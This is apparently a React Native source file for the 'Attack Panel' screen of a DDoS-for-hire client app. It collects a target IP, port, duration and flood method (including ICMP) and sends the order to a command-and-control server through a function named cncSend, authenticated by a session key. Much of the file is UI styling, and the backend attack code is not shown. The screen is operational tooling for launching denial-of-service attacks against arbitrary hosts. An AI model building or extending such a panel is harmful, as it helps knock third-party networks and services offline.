import React, { useState, useEffect, useRef } from 'react';
import {
  View,
  Text,
  StyleSheet,
  ScrollView,
  TouchableOpacity,
  TextInput,
  Alert,
  StatusBar,
  Animated,
  Dimensions,
} from 'react-native';
import { LinearGradient } from 'expo-linear-gradient';
import { Ionicons } from '@expo/vector-icons';
import Slider from '@react-native-community/slider';
import { COLORS, GRADIENTS } from '../utils/colors';
import { CustomInput } from '../components/CustomInput';
import { CustomButton } from '../components/CustomButton';
import { cncSend } from '../services/api';

const { width } = Dimensions.get('window');

interface AttackPanelScreenProps {
  navigation: any;
  route: {
    params: {
      sessionKey: string;
      listDoos: any[];
    };
  };
}

export const AttackPanelScreen: React.FC<AttackPanelScreenProps> = ({ navigation, route }) => {
  const { sessionKey, listDoos } = route.params;

  const [target, setTarget] = useState('');
  const [port, setPort] = useState('');
  const [selectedDoos, setSelectedDoos] = useState(listDoos[0]?.ddos_id || '');
  const [duration, setDuration] = useState(60);
  const [isAttacking, setIsAttacking] = useState(false);
  const [showDoosList, setShowDoosList] = useState(false);

  const pulseAnim = useRef(new Animated.Value(1)).current;
  const fadeAnim = useRef(new Animated.Value(0)).current;

  useEffect(() => {
    Animated.timing(fadeAnim, {
      toValue: 1,
      duration: 800,
      useNativeDriver: true,
    }).start();

    Animated.loop(
      Animated.sequence([
        Animated.timing(pulseAnim, {
          toValue: 1.1,
          duration: 1500,
          useNativeDriver: true,
        }),
        Animated.timing(pulseAnim, {
          toValue: 1,
          duration: 1500,
          useNativeDriver: true,
        }),
      ])
    ).start();
  }, []);

  const isIcmp = selectedDoos.toLowerCase() === 'icmp';

  const handleSend = async () => {
    const trimmedTarget = target.trim();
    const trimmedPort = port.trim();

    if (!trimmedTarget) {
      Alert.alert('Invalid Input', 'Target IP cannot be empty.');
      return;
    }

    if (!isIcmp && (!trimmedPort || isNaN(parseInt(trimmedPort)))) {
      Alert.alert('Invalid Port', 'Please input a valid port.');
      return;
    }

    setIsAttacking(true);

    try {
      const response = await cncSend(
        sessionKey,
        trimmedTarget,
        selectedDoos,
        isIcmp ? '0' : trimmedPort,
        Math.floor(duration)
      );

      if (response.cooldown === true) {
        Alert.alert('Cooldown', 'Please wait before sending again.');
      } else if (response.valid === false) {
        Alert.alert('Invalid Key', 'Your session key is invalid.');
      } else if (response.sended === false) {
        Alert.alert('Failed', 'Failed to send attack.');
      } else {
        Alert.alert('Success', `Attack sent to ${trimmedTarget}!`);
      }
    } catch (error) {
      Alert.alert('Error', 'An unexpected error occurred.');
    } finally {
      setIsAttacking(false);
    }
  };

  return (
    <View style={styles.container}>
      <StatusBar barStyle="light-content" backgroundColor={COLORS.primaryDark} />
      <LinearGradient colors={GRADIENTS.dark} style={styles.background}>
        {/* Header */}
        <View style={styles.header}>
          <TouchableOpacity onPress={() => navigation.goBack()} style={styles.backButton}>
            <Ionicons name="arrow-back" size={24} color={COLORS.primaryWhite} />
          </TouchableOpacity>
          <Text style={styles.headerTitle}>Attack Panel</Text>
          <View style={styles.headerIcon}>
            <Ionicons name="flash" size={20} color={COLORS.accentRed} />
          </View>
        </View>

        <ScrollView contentContainerStyle={styles.scrollContent}>
          <Animated.View style={{ opacity: fadeAnim }}>
            {/* Hero Card */}
            <LinearGradient colors={GRADIENTS.primary} style={styles.heroCard}>
              <Animated.View
                style={[styles.heroIconContainer, { transform: [{ scale: pulseAnim }] }]}
              >
                <Ionicons name="flash" size={40} color={COLORS.primaryWhite} />
              </Animated.View>
              <Text style={styles.heroTitle}>Network Attack Control</Text>
              <Text style={styles.heroSubtitle}>Configure and launch network attacks</Text>
            </LinearGradient>

            {/* Target Config Card */}
            <View style={styles.card}>
              <View style={styles.cardHeader}>
                <View style={styles.cardHeaderIcon}>
                  <Ionicons name="settings" size={20} color={COLORS.accentRed} />
                </View>
                <Text style={styles.cardTitle}>Target Configuration</Text>
              </View>

              <CustomInput
                label="Target IP"
                value={target}
                onChangeText={setTarget}
                placeholder="e.g. 1.1.1.1"
                icon="computer"
              />

              <CustomInput
                label="Port"
                value={port}
                onChangeText={setPort}
                placeholder={isIcmp ? 'ICMP does not use port' : 'e.g. 80'}
                icon="wifi"
                keyboardType="numeric"
                editable={!isIcmp}
              />

              {/* Duration Slider */}
              <View style={styles.sliderSection}>
                <View style={styles.sliderHeader}>
                  <Ionicons name="timer" size={20} color={COLORS.accentRed} />
                  <Text style={styles.sliderLabel}>Attack Duration</Text>
                  <View style={styles.durationBadge}>
                    <Text style={styles.durationText}>{Math.floor(duration)}s</Text>
                  </View>
                </View>
                <Slider
                  style={styles.slider}
                  minimumValue={10}
                  maximumValue={300}
                  step={10}
                  value={duration}
                  onValueChange={setDuration}
                  minimumTrackTintColor={COLORS.accentRed}
                  maximumTrackTintColor="rgba(220, 20, 60, 0.3)"
                  thumbTintColor={COLORS.accentRed}
                />
              </View>

              {/* Attack Method Dropdown */}
              <View style={styles.dropdownSection}>
                <View style={styles.dropdownHeader}>
                  <Ionicons name="flash" size={20} color={COLORS.accentRed} />
                  <Text style={styles.dropdownLabel}>Attack Method</Text>
                </View>
                <TouchableOpacity
                  style={styles.dropdown}
                  onPress={() => setShowDoosList(!showDoosList)}
                >
                  <Text style={styles.dropdownText}>
                    {listDoos.find(d => d.ddos_id === selectedDoos)?.ddos_name || 'Select Method'}
                  </Text>
                  <Ionicons
                    name={showDoosList ? 'chevron-up' : 'chevron-down'}
                    size={20}
                    color={COLORS.accentRed}
                  />
                </TouchableOpacity>

                {showDoosList && (
                  <View style={styles.dropdownList}>
                    {listDoos.map((doos, index) => (
                      <TouchableOpacity
                        key={index}
                        style={[
                          styles.dropdownItem,
                          doos.ddos_id === selectedDoos && styles.dropdownItemActive,
                        ]}
                        onPress={() => {
                          setSelectedDoos(doos.ddos_id);
                          setShowDoosList(false);
                        }}
                      >
                        <Text
                          style={[
                            styles.dropdownItemText,
                            doos.ddos_id === selectedDoos && styles.dropdownItemTextActive,
                          ]}
                        >
                          {doos.ddos_name}
                        </Text>
                      </TouchableOpacity>
                    ))}
                  </View>
                )}
              </View>
            </View>

            {/* Launch Button */}
            <CustomButton
              title={isAttacking ? 'INITIATING ATTACK...' : 'LAUNCH ATTACK'}
              onPress={handleSend}
              loading={isAttacking}
              icon={
                !isAttacking ? (
                  <Ionicons name="flash" size={20} color={COLORS.primaryWhite} />
                ) : undefined
              }
              style={styles.launchButton}
            />
          </Animated.View>
        </ScrollView>
      </LinearGradient>
    </View>
  );
};

const styles = StyleSheet.create({
  container: { flex: 1, backgroundColor: COLORS.primaryDark },
  background: { flex: 1 },
  header: {
    flexDirection: 'row',
    alignItems: 'center',
    paddingHorizontal: 16,
    paddingTop: 50,
    paddingBottom: 16,
  },
  backButton: {
    width: 44,
    height: 44,
    borderRadius: 12,
    backgroundColor: COLORS.glassColor,
    alignItems: 'center',
    justifyContent: 'center',
  },
  headerTitle: {
    flex: 1,
    fontSize: 20,
    fontWeight: 'bold',
    color: COLORS.primaryWhite,
    fontFamily: 'Orbitron',
    marginLeft: 12,
  },
  headerIcon: {
    width: 44,
    height: 44,
    borderRadius: 12,
    backgroundColor: 'rgba(220, 20, 60, 0.2)',
    alignItems: 'center',
    justifyContent: 'center',
  },
  scrollContent: { padding: 16, paddingBottom: 40 },
  heroCard: {
    borderRadius: 16,
    padding: 24,
    alignItems: 'center',
    marginBottom: 24,
  },
  heroIconContainer: {
    width: 80,
    height: 80,
    borderRadius: 40,
    backgroundColor: 'rgba(255, 255, 255, 0.2)',
    alignItems: 'center',
    justifyContent: 'center',
    marginBottom: 16,
  },
  heroTitle: {
    fontSize: 20,
    fontWeight: 'bold',
    color: COLORS.primaryWhite,
    fontFamily: 'Orbitron',
  },
  heroSubtitle: {
    fontSize: 14,
    color: 'rgba(255, 255, 255, 0.8)',
    fontFamily: 'ShareTechMono',
    marginTop: 8,
    textAlign: 'center',
  },
  card: {
    backgroundColor: COLORS.cardDark,
    borderRadius: 16,
    padding: 20,
    marginBottom: 24,
  },
  cardHeader: {
    flexDirection: 'row',
    alignItems: 'center',
    marginBottom: 20,
  },
  cardHeaderIcon: {
    width: 36,
    height: 36,
    borderRadius: 10,
    backgroundColor: 'rgba(220, 20, 60, 0.2)',
    alignItems: 'center',
    justifyContent: 'center',
    marginRight: 12,
  },
  cardTitle: {
    fontSize: 18,
    fontWeight: 'bold',
    color: COLORS.primaryWhite,
    fontFamily: 'Orbitron',
  },
  sliderSection: {
    marginBottom: 20,
  },
  sliderHeader: {
    flexDirection: 'row',
    alignItems: 'center',
    marginBottom: 12,
  },
  sliderLabel: {
    flex: 1,
    color: COLORS.primaryWhite,
    fontSize: 16,
    fontWeight: '500',
    fontFamily: 'ShareTechMono',
    marginLeft: 8,
  },
  durationBadge: {
    backgroundColor: 'rgba(220, 20, 60, 0.2)',
    paddingHorizontal: 12,
    paddingVertical: 4,
    borderRadius: 12,
  },
  durationText: {
    color: COLORS.accentRed,
    fontWeight: 'bold',
    fontFamily: 'Orbitron',
  },
  slider: {
    width: '100%',
    height: 40,
  },
  dropdownSection: {
    marginTop: 4,
  },
  dropdownHeader: {
    flexDirection: 'row',
    alignItems: 'center',
    marginBottom: 12,
  },
  dropdownLabel: {
    color: COLORS.primaryWhite,
    fontSize: 16,
    fontWeight: '500',
    fontFamily: 'ShareTechMono',
    marginLeft: 8,
  },
  dropdown: {
    flexDirection: 'row',
    alignItems: 'center',
    justifyContent: 'space-between',
    backgroundColor: COLORS.cardDarker,
    borderRadius: 12,
    borderWidth: 1,
    borderColor: 'rgba(220, 20, 60, 0.3)',
    paddingHorizontal: 16,
    paddingVertical: 14,
  },
  dropdownText: {
    color: COLORS.primaryWhite,
    fontSize: 16,
    fontFamily: 'ShareTechMono',
  },
  dropdownList: {
    backgroundColor: COLORS.cardDarker,
    borderRadius: 12,
    borderWidth: 1,
    borderColor: 'rgba(220, 20, 60, 0.3)',
    marginTop: 8,
    overflow: 'hidden',
  },
  dropdownItem: {
    paddingHorizontal: 16,
    paddingVertical: 14,
    borderBottomWidth: 1,
    borderBottomColor: 'rgba(255, 255, 255, 0.1)',
  },
  dropdownItemActive: {
    backgroundColor: 'rgba(220, 20, 60, 0.2)',
  },
  dropdownItemText: {
    color: COLORS.accentGrey,
    fontSize: 14,
    fontFamily: 'ShareTechMono',
  },
  dropdownItemTextActive: {
    color: COLORS.accentRed,
    fontWeight: 'bold',
  },
  launchButton: {
    marginTop: 8,
  },
});